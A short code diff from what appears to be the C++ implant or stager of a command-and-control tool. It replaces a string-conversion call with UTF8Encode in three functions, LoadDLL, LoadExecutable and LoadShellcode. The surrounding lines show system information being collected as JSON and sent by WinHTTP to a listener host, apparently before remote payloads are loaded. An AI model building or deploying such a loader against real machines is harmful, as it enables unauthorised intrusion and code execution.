@@ -9,7 +9,7 @@ BOOL LoadDLL()
 
     // Get system information as json.
     std::wstring wInfoJson = GetInitialInfo();
-    std::string sInfoJson = ConvertWstringToString(wInfoJson.c_str());
+    std::string sInfoJson = UTF8Encode(wInfoJson);
 
 	WinHttpHandlers handlers = InitRequest(
 		LISTENER_HOST_W,
@@ -86,7 +86,7 @@ BOOL LoadExecutable()
 
     // Get system information as json.
     std::wstring wInfoJson = GetInitialInfo();
-    std::string sInfoJson = ConvertWstringToString(wInfoJson.c_str());
+    std::string sInfoJson = UTF8Encode(wInfoJson);
 
 	WinHttpHandlers handlers = InitRequest(
 		LISTENER_HOST_W,
@@ -158,7 +158,7 @@ BOOL LoadShellcode()
 
     // Get system information as json.
     std::wstring wInfoJson = GetInitialInfo();
-    std::string sInfoJson = ConvertWstringToString(wInfoJson.c_str());
+    std::string sInfoJson = UTF8Encode(wInfoJson);
 
 	WinHttpHandlers handlers = InitRequest(
 		LISTENER_HOST_W,
